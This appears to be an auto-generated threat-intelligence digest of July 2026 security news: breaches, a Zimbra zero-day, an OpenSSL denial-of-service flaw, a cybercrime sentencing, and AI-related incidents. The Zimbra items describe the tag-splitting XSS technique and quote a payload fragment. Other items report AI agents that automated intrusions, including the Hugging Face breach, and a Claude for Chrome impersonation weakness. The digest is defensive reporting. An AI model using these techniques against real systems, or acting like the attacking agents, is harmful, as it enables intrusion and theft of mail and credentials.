  - Title: Threat Hunting: A Guide | Recorded Future
  - Published: 2026-07-20T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/cyber-threat-hunting
  - Summary: Master modern cyber threat hunting by embracing real-time threat intelligence. Discover the elite tools, steps, and frameworks to expose hidden adversaries.

### Cluster 2bab6cab95 — score 10

- Title: 20th July – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-07-20T12:18:41+00:00
- Link: https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Anthropic/Claude, Microsoft SharePoint, WordPress
- cve_ids: CVE-2026-15409, CVE-2026-56155, CVE-2026-56164, CVE-2026-60137, CVE-2026-63030
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Anthropic/Claude, Microsoft SharePoint, WordPress
- cve_ids: CVE-2026-56164, CVE-2026-56155, CVE-2026-63030, CVE-2026-60137, CVE-2026-15409
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 20th July – Threat Intelligence Report July 20, 2026 https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, employee details, and other sensitive information submitted while requesting technical assistance. Jscrambler, a JavaScript code-protection package with more than 15,000 weekly downloads, has experienced a supply chain compromise after stolen npm publishing credentials distributed malicious releases. The packages deployed malware targeting developers’, cloud, browser, cryptocurrency, and messaging credentials. Jscrambler removed the affected versions. Coca-Cola’s US dairy subsidiary Fairlife has confirmed a ransomware attack that temporarily halted production across the United States. Attackers accessed systems supporting manufacturing operations, prompting the company to activate incident response and business continuity procedures. Coca-Cola has not confirmed whether data was exfiltrated in the attack. Nihon Kotsu, Japan’s largest taxi operator, has suffered a malware attack following unauthorized access to its internal network. The company shut down affected systems, disrupting taxi dispatches, telephone services, bookings, reservations, and car rentals from July 11. No theft of customer or corporate information has been confirmed. AI THREATS Researchers identified a China-linked campaign that used Claude Code and DeepSeek to automate attacks against government and financial organizations. The tools generated scripts, adapted failed exploits, created credential-harvesting pages, and executed commands. Confirmed compromises affected government systems in Thailand and Afghanistan and organizations in Taiwan. Researchers found that xAI’s Grok Build coding assistant could upload entire Git repositories while processing debugging requests. Transferred information included unopened files and complete commit histories, potentially exposing API keys, credentials, and proprietary source code. Initial privacy controls did not prevent uploads until a server-side restriction was introduced. Researchers verified a weakness in Anthropic’s Claude for Chrome extension that allowed malicious browser extensions to impersonate Claude and act through authenticated user sessions. Successful exploitation could expose Gmail, Google Drive, or GitHub information through Claude’s permissions. Anthropic released fixes, although researchers reported that a bypass remained possible. VULNERABILITIES AND PATCHES Microsoft released patches for 622 vulnerabilities in July’s Patch Tuesday, the largest monthly release recorded by the company. Two vulnerabilities were under active exploitation, including CVE-2026-56164 in SharePoint Server and CVE-2026-56155 in Active Directory Federation Services. Both vulnerabilities could allow attackers to elevate privileges. Check Point IPS provides protection against these threats (Microsoft SharePoint Authentication Bypass (CVE-2026-56164)) WordPress has issued emergency updates for CVE-2026-63030 and CVE-2026-60137, collectively called wp2shell. The critical WordPress Core vulnerabilities allow unauthenticated remote code execution and website takeover. Affected releases include versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1. Fixed versions include 6.9.5 and 7.0.2. Check Point IPS provides protection against these threats (WordPress Authentication Bypass (CVE-2026-63030)), WordPress SQL Injection (CVE-2026-60137)) SonicWall has released a hotfix for CVE-2026-15409 and CVE-2026-15410, two critical vulnerabilities affecting SMA 1000 Series gat
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 20th July – Threat Intelligence Report
  - Published: 2026-07-20T12:18:41+00:00
  - Link: https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .

### Cluster c68e26f04e — score 10

- Title: Australian energy provider Origin says data breach exposes client data
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-23T20:14:35+00:00
- Link: https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- actor_attribution: ShinyHunters
- affected_industries: critical_infrastructure, financial_services, government, telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, critical_infrastructure, telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Origin Energy has confirmed that an unauthorized party accessed and subsequently leaked customer data online, exposing sensitive personally identifiable information (PII), among others. [...]
```

#### Full body

```
Australian energy provider Origin says data breach exposes client data By Bill Toulas July 23, 2026 04:14 PM 0 Australian energy provider Origin Energy has confirmed a data breach by an unknown threat actor that exposed customers' personally identifiable information (PII). The company has 4.8 million customers and is currently investigating how many of them have been impacted to inform them of the risk via individual notifications. Origin Energy is Australia’s largest energy retailer, providing electricity, natural gas, and broadband internet services to millions of clients across the country. The company is listed on the ASX, has annual revenue of $8.5 billion, and holds a 20% ownership stake in the UK’s renewable energy retailer Octopus. Yesterday, Origin announced that it had launched an investigation into “a potential security incident that may involve unauthorized access to some customers’ data.” An update published today confirms a data breach , listing the following data types as potentially exposed: Full name Physical address Date of birth Phone number Account information Last four digits of credit card Last three digits of bank account The company noted that the exposed financial details are “incomplete” and cannot be used to hijack accounts or make unauthorized charges to clients’ bank accounts. Origin CEO, Frank Calabria, apologized to customers for the sensitive data being exposed, and assured them that the company is taking steps to block further unauthorized access. Also, confirmed impacted clients are being contacted directly and offered support via a dedicated portal and related resources. Origin has informed the Australian Federal Police (AFP), the Australian Cyber Security Centre, and the Office of the Australian Information Commissioner about the incident, and continues to engage with the agencies as needed. Hackers claim large-scale data theft Local media outlet 7news reported that before Origin Energy released its second statement, a threat actor identifying as “John Doe” contacted them to claim the breach. The threat actor alleged to be holding the data types for 2 million Origin customers. Threat actor's message to Origin Source: 7news The hacker claimed that they contacted security teams, customer support, and even board executives, without receiving a response. The hacker has set up a site where he threatens to leak the stolen data in two weeks unless Origin contacts them via Signal to negotiate a solution. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Mount Royal University confirms breach as hackers claim attack NAIC says public data stolen in ShinyHunters' PeopleSoft breach 7-Eleven confirms data breach claimed by the ShinyHunters gang Upbound says hack caused $13 million in fraudulent Acima leases Swiss rail giant Stadler rejects $12.3M ransom demand after cyberattack
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Australian energy provider Origin says data breach exposes client data
  - Published: 2026-07-23T20:14:35+00:00
  - Link: https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/
  - Summary: Origin Energy has confirmed that an unauthorized party accessed and subsequently leaked customer data online, exposing sensitive personally identifiable information (PII), among others. [...]

### Cluster 02b144b02f — score 10

- Title: Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-07-23T17:33:37+00:00
- Link: https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: critical_infrastructure, education, financial_services, government
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage
- affected_industries: financial_services, government, critical_infrastructure, education
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Laundry Bear exploited a zero-day vulnerability for five months before it was patched in November 2025, and the group is still actively exploiting vulnerable environments. The post Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries appeared first on CyberScoop .
```

#### Full body

```
Advertisement Subscribe to our daily newsletter. Subscribe Close A Russian state-sponsored threat group has been stealing sensitive data from governments and commercial organizations since July 2025 via a novel exploit in popular Linux-based enterprise software, U.S. authorities and cyber officials from more than a dozen other countries warned in a joint cybersecurity advisory Thursday. Laundry Bear’s most recent espionage campaign involves the exploitation of a zero-day vulnerability in Zimbra Collaboration Suite that wasn’t patched until November 2025, five months after attacks were well underway, officials said. The exploit just requires a view — no clicks — and allows attackers to steal the previous 90 days’ worth of email, the account’s password, search history, the victim organization’s email directory, two-factor authentication tokens and other newly created passwords. “The covert and persistent nature of this activity, along with the absence of any known financial extortion, almost certainly indicates this group’s involvement in espionage activities with Russian government backing,” officials wrote in the advisory. Advertisement “Additionally, extensive Ukrainian targeting, prior to use against U.S. and other NATO allies, outlines an increasing trend within Russian cyber threat groups to target Ukrainian users first—both as a priority target and as a testbench for malicious cyber techniques before broader global deployment.” The state-sponsored espionage group, also known as Void Blizzard, has compromised governments and organizations in the defense, education, energy, law enforcement, media, finance, transportation and technology sectors. Laundry Bear’s year-long campaign involving the exploitation of CVE-2025-66376 showcases more technical capabilities, including a custom JavaScript payload it delivers to targeted victims via phishing emails. The threat group could also likely adapt the novel data exfiltration and aggregation capability, dubbed “beehive,” to exploit other vulnerabilities, officials warned. The defect’s medium-severity rating of 6.1 underscores the challenge defenders regularly confront in prioritizing patching schedules based on measure of severity alone. The Russian state-supported group, which has been active since at least 2024, is still actively exploiting Zimbra Collaboration Suite instances that remain unpatched, officials said. Advertisement Authorities shared Thursday indicators of compromise, mitigation steps and urged organizations to update their vulnerable software. “This campaign’s targeted victimology and limited exploitation capabilities likely indicate this group manually identifies and targets the victim organizations” by identifying organizations with public-facing infrastructure, officials wrote in the advisory. Once a target is identified, Laundry Bear also likely compiles email addresses for users to target with the exploit via phishing emails. Officials did not identify specific victims or describe the volume of organizations already compromised. The joint cybersecurity advisory was issued by the United States, Australia, Canada, New Zealand, the United Kingdom, Czech Republic, Denmark, Estonia, Finland, France, Italy, Moldova, the Netherlands, Poland, Spain and Sweden. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Advertisement More Scoops Gwengoat, iStock/Getty Images Plus (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity A builder’s view of the AI arms race What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Government Most federal cybersecurity reporting rules are duplicative, study finds White House accuses Chinese company of distilling Anthropic’s Fable AI models keep getting caught cheating Where’s the Trump administration line on AI regulation? Technology OpenAI says model test was behind Hugging
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries
  - Published: 2026-07-23T17:33:37+00:00
  - Link: https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/
  - Summary: Laundry Bear exploited a zero-day vulnerability for five months before it was patched in November 2025, and the group is still actively exploiting vulnerable environments. The post Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries appeared first on CyberScoop .

### Cluster 76e10c02ae — score 10

- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-23T18:36:08+00:00
- Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
```

#### Full body

```
Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes  Swati Khandelwal  Jul 23, 2026 Email Security / Vulnerability A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA , CISA and partner agencies published a joint advisory on the campaign Thursday, alongside research from Palo Alto Networks' Unit 42 and Proofpoint. The advisory calls the technique "a view-based exploit that only requires a user to view a malicious email" in a vulnerable client. It says the actors have been targeting and compromising Western government and commercial organizations through Zimbra since at least July 2025. The flaw, CVE-2025-66376 , is a stored cross-site scripting vulnerability in Zimbra's Classic UI. A crafted HTML email abuses CSS @import handling to execute JavaScript inside an authenticated webmail session, so the payload inherits the user's access to the mailbox. The two CVSS records disagree on whether viewing the message counts as user interaction: NVD scores it 6.1 and says it does; MITRE scores it 7.2 and says it does not. Unit 42 calls it zero-click. All three describe the same behavior: the message runs when it renders, and nothing else has to happen. It affects Zimbra Collaboration 10.0 before 10.0.18 and 10.1 before 10.1.13 . Zimbra fixed it on November 6, 2025, and CISA added it to the Known Exploited Vulnerabilities catalog on March 18, 2026. Proofpoint , which tracks the actor as TA488, said the group exploited the bug as an unknown vulnerability for at least five months during 2025, before that fix existed. The patch closes the hole, not the account. An update does not revoke credentials the payload already took. Proofpoint said the messages went out from adversary-controlled Proton Mail accounts and from previously compromised addresses, using generic lures. Unit 42 , which tracks the activity as CL-STA-1114, said they were often dressed as a digest of current news. The exploit sits in the HTML body. It hides an svg onload tag inside a display:none div, then breaks the tag apart with fake @import directives and HTML comments, a technique Proofpoint calls tag-splitting. Zimbra's sanitizer does not recognize the fragments as executable markup. It strips the @import sequences, and the characters left behind join into <svg onload=eval(atob(...))> , which the browser runs. Proofpoint tracks the JavaScript payload as ZimReaper. It steals the CSRF token and the browser's autofilled password, pulls 2FA scratch codes and Zimbra version details through the platform's own APIs, and exfiltrates them over DNS queries to actor infrastructure. Then it brute-forces the Global Address List, querying every two-character combination until the whole list comes back, and posts 90 days of the victim's mail to the C2 as a TGZ archive. Unit 42 counted at least nine C2 IP addresses and nine domains, each server live for an average of 35.4 days. It named no affected organizations and gave no victim count. Its list of sectors and regions describes who was targeted. It does not say who was compromised. That list runs across government, defense, transportation and financial organizations in NATO member states, Ukraine, the Commonwealth of Independent States and Africa. Proofpoint puts US organizations on it too: government, scientific and defense industrial base entities, including nuclear installations. The payload mints an app-specific password named ZimbraWeb through CreateAppSpecificPasswordRequest , which can grant IMAP, POP3 or SMTP access without two-factor authentication. Proofpoint said TA488 went on to send further exploit emails from compromised mailservers, and could not say whether the app passwords or other stolen
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
  - Published: 2026-07-23T18:36:08+00:00
  - Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
  - Summary: A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published

### Cluster 2de7ac9412 — score 10

- Title: World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-20T05:27:26+00:00
- Link: https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach, phishing_social_eng, supply_chain
- affected_products: Microsoft 365
- content_type: threat_research
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, phishing_social_eng, credential_theft, data_breach
- affected_products: Microsoft 365
- content_type: threat_research
- confidence_tier: tier_4_news

#### Summary

```
In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by
```

#### Full body

```
World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent  Ravie Lakshmanan  Jul 20, 2026 AI Security / Vulnerability In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by our services," the company said in a statement. While an investigation into the intrusion remains ongoing, Hugging Face said it has found no evidence that the AI agent tampered with public, user-facing models, datasets, or Spaces, and its own software supply chain. The starting point of the attack was the data processing pipeline itself, with a malicious dataset abusing two code execution paths, viz., in its remote code dataset loader and a template injection in a dataset configuration, to run code on a processing worker. With that access, the threat actor is said to have escalated to node-level access, collected cloud and cluster credentials, and moved laterally into several internal clusters over a weekend. The exact large language model (LLM) used to pull off the attack is unclear, but the campaign was executed by an autonomous agent framework performing "many thousands of individual actions across a swarm of short-lived sandboxes, with self-migrating command-and-control staged on public services." Hugging Face said it has since addressed the root cause of the issue, precisely the code execution pathways used for initial access. It also carried out the following remediation steps - Removed the attacker's foothold across the affected clusters and rebuilt the compromised nodes Revoked and rotated the affected credentials and tokens, and a broader rotation of secrets was undertaken as a precautionary measure. Deployed additional guardrails and stricter admission controls on its clusters Improved detection and alerting to ensure responders are notified within minutes, 24x7 As a further safeguard, Hugging Face is urging customers to rotate any access tokens and review recent activity on their accounts. The company also said it turned to Z.ai's GLM 5.2 , a Chinese open-weight model, to conduct the forensic analysis after Western frontier models refused requests containing real attack commands, exploit payloads, and command-and-control (C2) artifacts because their safety guardrails were triggered and owing to their inability to differentiate between an attacker and a legitimate incident response effort. "This experience points to a gap worth planning for," the New York-headquartered company said. "We do not know which model powered the attacker's agents, whether a jailbroken hosted model or an unrestricted open-weight one; either way, the attacker was bound by no usage policy, while our own forensic work was blocked by the guardrails of the hosted models we first tried." "The practical lesson for defenders: have a capable model you can run on your own infrastructure vetted and ready before an incident, both to avoid guardrail lockout and to keep attacker data and credentials from leaving your environment." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  AI Security , Cloud security , Code Execution , Credential Theft , Cyber Attack , data breach , Incident response , Infrastructure Security , Open Source , Vulnerability ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Throu
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: World's Largest AI Model Repository Hugging Face Breached by Autonomous AI Agent
  - Published: 2026-07-20T05:27:26+00:00
  - Link: https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
  - Summary: In an ironic twist, open-source artificial intelligence (AI) platform Hugging Face revealed that it was the victim of a hack perpetrated by an autonomous AI agent system. The company said it detected and responded to the incident targeting its production infrastructure earlier last week. "We identified unauthorized access to a limited set of internal datasets and to several credentials used by

### Cluster c617455b3a — score 10

- Title: OpenSSL HollowByte Flaw Could Freeze Server Memory with 11-Byte TLS Requests
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-17T20:20:53+00:00
- Link: https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Okta

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- affected_products: GitHub, Okta
- cve_ids: CVE-2025-66199, CVE-2026-34183
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos
- affected_products: Okta, GitHub
- cve_ids: CVE-2025-66199, CVE-2026-34183
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Eleven bytes will make an unpatched OpenSSL server set aside up to 131 KB of memory for a message that never arrives. On the glibc systems Okta tested, that memory is gone until the process restarts. OpenSSL shipped the HollowByte fix in June with no CVE, no advisory, and no changelog entry pointing at it. Okta's Red Team, which reported the denial-of-service bug and named it, published the
```

#### Full body

```
OpenSSL HollowByte Flaw Could Freeze Server Memory with 11-Byte TLS Requests  Swati Khandelwal  Jul 17, 2026 Vulnerability / Server Security Eleven bytes will make an unpatched OpenSSL server set aside up to 131 KB of memory for a message that never arrives. On the glibc systems Okta tested, that memory is gone until the process restarts. OpenSSL shipped the HollowByte fix in June with no CVE, no advisory, and no changelog entry pointing at it. Okta's Red Team, which reported the denial-of-service bug and named it, published the details on Thursday. The fixed releases are OpenSSL 4.0.1, 3.6.3, 3.5.7, 3.4.6, and 3.0.21 , all dated June 9. Every release on those branches before the fixed ones has it. Nothing in a normal patch pipeline will point you at them: there is no identifier for a scanner to match and no advisory to read. The flaw is that OpenSSL took the attacker's word for it. Every TLS handshake message carries a 4-byte header, three bytes of which declare how long the body will be. Older versions grew the receive buffer to that declared size the moment the header landed, before a single byte of the body showed up, and before the handshake's own checks ran. For an inbound ClientHello the ceiling is 131 KB. Then the worker thread blocks, waiting on a body that never comes. No authentication, no session, no key exchange. The memory does not come back On its own, that is a connection-exhaustion attack, and those are as old as Slowloris . What makes HollowByte stick is glibc. When the attacker drops the connection, OpenSSL frees the buffer, but glibc holds small and medium chunks for reuse rather than returning them to the kernel. The attack varies the claimed size on every connection, and in Okta's tests, that was enough to stop the allocator from reusing what it freed. The heap fragments, resident set size climbs, and it stays climbed long after the attacker has gone. In Okta's NGINX testing, a 1 GB server was OOM-killed with 547 MB of memory frozen in fragments. On a 16 GB server, HollowByte locked up 25% of system memory without ever crossing the connection ceiling, which is why the Red Team says "standard connection-limiting defenses won't stop it" . Those figures are Okta's own, and it published no exploit code alongside them. The Hacker News found no public proof-of-concept repository on GitHub as of July 18. OpenSSL decided this wasn't a vulnerability The pull request from Matt Caswell, who wrote the patch, puts it plainly: the security team chose to "handle this as a 'bug or hardening' only fix". OpenSSL's own security policy defines four severity tiers, Critical down to Low, and "bug or hardening" is not among them. Even a Low issue earns a CVE, a changelog note, and an entry on the vulnerabilities page. HollowByte has none of the three. The Hacker News found no mention of the fix in the release notes or in all 23 entries of OpenSSL's 4.0.1 changelog . OpenSSL has not said why. Here is the case for them: 131 KB per connection is small, every TLS server allocates memory per connection, and a bounded allocation is not a vulnerability. Okta's answer is that the memory never comes back. The Hacker News has asked OpenSSL why HollowByte was triaged below Low, and whether the fix reached the extended-support 1.1.1 and 1.0.2 branches. It has also asked Okta whether the fragmentation survives allocators other than glibc. This story will be updated with any response. The project's line is finer than it looks. In January, OpenSSL assigned CVE-2025-66199 , rated Low, to a TLS 1.3 certificate-compression bug in which a peer-supplied length grew a heap buffer before validation, worth around 22 MiB per connection. That one needed four things to line up: certificate compression compiled in, a compression algorithm available, the extension negotiated, and, on servers, client certificates requested. HollowByte needs none of them. The same June 9 release assigned CVE-2026-34183 , rated Moderate, to unbounded memory growth in the Q
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: OpenSSL HollowByte Flaw Could Freeze Server Memory with 11-Byte TLS Requests
  - Published: 2026-07-17T20:20:53+00:00
  - Link: https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html
  - Summary: Eleven bytes will make an unpatched OpenSSL server set aside up to 131 KB of memory for a message that never arrives. On the glibc systems Okta tested, that memory is gone until the process restarts. OpenSSL shipped the HollowByte fix in June with no CVE, no advisory, and no changelog entry pointing at it. Okta's Red Team, which reported the denial-of-service bug and named it, published the

### Cluster a632c3dcbf — score 10

- Title: Scattered Spider duo sentenced to prison over TfL hack
- Source: Intel 471 (ransomware_ecrime_financial_crime)
- Published: 2026-07-17T15:38:56+00:00
- Link: https://www.intel471.com/blog/scattered-spider-duo-sentenced-to-prison-over-tfl-hack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Scattered Spider

#### Cluster taxonomy (union across members)
- actor_attribution: Scattered Spider
- affected_industries: critical_infrastructure, financial_services, government
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- actor_attribution: Scattered Spider
- affected_industries: financial_services, government, critical_infrastructure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Two Scattered Spider members have been sentenced to five and a half years in prison for the 2024 cyberattack on Transport for London (TfL), a case the UK's National Crime Agency called the country's "biggest ever cyber crime case."
```

#### Full body

```
Thalha Jubair, 20, and Owen Flowers, 18, two lead members of the Scattered Spider intrusion cluster, have been sentenced to five and a half years in prison each after admitting to the 2024 cyberattack on Transport for London (TfL) that they carried out as teenagers. The National Crime Agency (NCA) called it the “UK’s biggest ever cyber crime case”. The pair pleaded guilty on June 22, 2026 — the first day of what would have been a six‑week trial — to conspiring to commit unauthorized acts against TfL under the Computer Misuse Act (CMA). At sentencing at Woolwich Crown Court on July 16, 2026, the judge reduced the length of their sentences by 15% for the guilty pleas. The attack on TfL ran between Aug. 31–Sept. 3, 2024, when Flowers was 17 and Jubair was 18. It cost TfL a reported 29 million pounds (about US $38 million) in losses and recovery, forced all of TfL's roughly 27,000 staff to reset passwords in person, and rendered 148 systems inoperable. Public-facing services were also disrupted. The NCA said the prosecution is only the second of its kind in the UK under Section 3ZA of the CMA — the act's most serious provision, which applies where an unauthorized act causes, or creates a significant risk of, serious damage and the offender intends or is reckless as to that damage. Both defendants argued they were merely reckless. The NCA is nonetheless calling it the largest cyber crime prosecution ever brought before the UK courts, the culmination of nearly two years of work by the NCA, the Crown Prosecution Service and City of London Police, with support from the FBI. Flowers, who was arrested in September 2024, admitted attempting to hack U.S. health care providers SSM Health Care Corp. and Sutter Health. Investigators say forensic evidence pulled from devices seized at his home — including a screenshot showing connectivity to TfL infrastructure and videos of the intrusion in progress — also exposed Jubair's involvement, with the pair coordinating over Telegram and a shared online workspace. Flowers breached bail twice in 2025 and was re‑arrested for breaching conditions related to his device usage. Jubair was separately charged with failing to disclose the PINs or passwords for devices seized from him. Jubair faces much greater punishment across the Atlantic. In September 2025, the U.S. District Court for the District of New Jersey charged him with computer fraud, wire fraud and money laundering conspiracies tied to roughly 120 intrusions against 47 U.S. entities between May 2022 and September 2025, with victims paying at least US $115 million in ransoms. Prosecutors allege the targets included a U.S. critical infrastructure operator and the federal court system — where intruders accessed a magistrate judge's inbox and searched for "subpoena" and "scattered spider." Investigators seized about US $36 million in cryptocurrency from a server linked to Jubair, who allegedly moved roughly US $8.4 million out mid‑seizure. He faces decades in prison if convicted, and the prospect of extradition looms over any UK sentence. The U.S. is pressing the wider group as well. On July 1, 2026, prosecutors announced that alleged Scattered Spider member Peter Stokes — a 19‑year‑old U.S.-Estonian dual national — had been arrested in Finland and extradited to Chicago to face conspiracy, computer intrusion and fraud charges. Linking multiple underground personas The New Jersey complaint attributes the handles EarthtoStar , Brad , Austin and @autistic to Jubair , linking him to a series of intrusions dating back to 2022. That timeline aligns with Intel 471's prior reporting on Jubair , whom we have connected to multiple personas and communities across the predominantly English-speaking underground. Our research connected Jubair to multiple groups and communities, some of which included: A former Infinity Recursion member using the Everlynn handle. A former LAPSUS$ member operating under the ASyntax and Amtrak handles. Allegedly was the Doxbin admini
```

#### Corroborating sources (1)

- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: Scattered Spider duo sentenced to prison over TfL hack
  - Published: 2026-07-17T15:38:56+00:00
  - Link: https://www.intel471.com/blog/scattered-spider-duo-sentenced-to-prison-over-tfl-hack
  - Summary: Two Scattered Spider members have been sentenced to five and a half years in prison for the 2024 cyberattack on Transport for London (TfL), a case the UK's National Crime Agency called the country's "biggest ever cyber crime case."

### Cluster 1186a44566 — score 10

- Title: GitHub issues $100,000 bounty for critical RCE vulnerability
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-07-22T22:21:24+00:00
- Link: https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
